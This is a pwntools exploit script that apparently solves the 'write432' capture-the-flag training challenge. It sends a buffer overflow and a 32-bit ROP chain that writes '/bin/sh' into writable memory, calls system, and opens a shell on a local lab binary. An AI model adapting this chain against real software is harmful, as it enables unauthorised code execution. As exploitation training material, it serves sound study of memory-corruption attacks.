#!/usr/bin/env python

from pwn import *

p = process("./write432")
p.recv(1024)

payload = (
    "\x90" * 44 +
    p32(0x080486da) + # pop edi ; pop ebp ; ret
    p32(0x0804a028) + # 0x0804a000 0x0804b000 0x00001000 rw- 
    "/bin" +
    p32(0x08048670) + # mov dword ptr [edi], ebp ; ret
    p32(0x080486da) + # pop edi ; pop ebp ; ret
    p32(0x0804a02c) + # 0x0804a000 0x0804b000 0x00001000 rw-
    "/sh\x00" +
    p32(0x08048670) + # mov dword ptr [edi], ebp ; ret
    p32(0x08048430) + # system@plt
    p32(0x41414141) + # ebp
    p32(0x0804a028)  # /bin/sh 
)

p.sendline(payload)
p.interactive()

p.close()

